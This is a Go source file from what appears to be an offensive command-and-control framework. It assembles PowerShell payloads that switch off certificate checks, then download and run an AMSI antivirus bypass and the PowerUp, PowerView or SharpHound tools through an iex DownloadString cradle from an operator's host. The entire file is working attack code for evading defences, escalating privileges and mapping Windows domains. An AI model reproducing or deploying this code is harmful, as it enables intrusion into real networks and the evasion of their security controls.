package injection

import (
	"MoP/src/config"
	"MoP/src/middlewares"
	"fmt"
)

var (
	CertificateBypass = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
)

func HandleModules(command string) string {
	slicedCommand := middlewares.SliceCommand(command)
	module := slicedCommand[1]
	var payload string

	switch module {
	case "PowerUp":
		payload += CertificateBypass + amsi() + "; " + localPrivEsc(module)
		return payload
	case "PowerView":
		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
		return payload
	case "PowerView_dev":
		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
		return payload
	case "PowerView_2022":
		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
		return payload
	case "SharpHound":
		payload += CertificateBypass + amsi() + "; " + domainEnum(module)
		return payload
	default:
		//
	}
	return ""
}

func amsi() string {
	url := iex("bypass/amsi.ps1")
	return url
}

func domainEnum(payload string) string {
	url := iex(fmt.Sprintf("Domain_Enum/%s.ps1", payload))
	return url
}

func localPrivEsc(payload string) string {
	url := iex(fmt.Sprintf("Local_PrivEsc/%s.ps1", payload))
	return url
}

func iex(payload string) string {
	url := "iex(New-Object Net.WebClient).DownloadString(\"" + config.Load().Hostname + "/drop/win/" + payload + "\") "
	return url
}
